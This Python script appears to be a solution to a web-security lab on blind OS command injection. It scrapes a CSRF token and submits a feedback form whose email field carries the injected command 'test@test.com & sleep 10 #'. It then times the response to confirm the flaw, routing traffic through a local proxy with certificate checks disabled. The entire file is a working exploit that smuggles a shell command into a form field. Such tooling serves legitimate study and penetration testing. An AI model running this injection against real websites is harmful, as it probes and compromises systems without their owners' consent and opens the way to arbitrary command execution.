import requests
import urllib3
from bs4 import BeautifulSoup
import sys

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8081', 'https': 'http://127.0.0.1:8081'}

def get_csrf_token(s,url):
    feedback_path = '/feedback'
    r1 = s.get(url+feedback_path, verify=False, proxies=proxies)
    soup = BeautifulSoup(r1.text, 'html.parser')
    csrf = soup.find('input', {'name': 'csrf'})['value']
    if not csrf:
        print("[-] CSRF token not found.")
        sys.exit(-1)
    return csrf

def check_command_execution(s,url):
    submit_feedback_path='/feedback/submit'
    command_injection = 'test@test.com & sleep 10 #'
    csrf_token = get_csrf_token(s, url)
    params={"csrf":csrf_token,"name": "test","email": command_injection,"subject": "test","message": "test"}
    r2 = s.post(url + submit_feedback_path, data=params, verify=False, proxies=proxies)
    if (r2.elapsed.total_seconds() >=10):
        print("(+) Email field vulnerable to time-based command injection!")
    else:
        print("(-) Email field not vulnerable to time-based command injection")
def main():
    if len(sys.argv)!=2:
        print("[+] Usage: %s <url>" % sys.argv[0])
        print("[+] Example: %s https://evil.com" % sys.argv[0])
        sys.exit(-1)
    else:
        url=sys.argv[1].rstrip("/")
        print("[+] Checking if email parameter is vulnerable to time-based command injection...")
        s = requests.Session()
        check_command_execution(s,url)
if __name__ == "__main__":
    main()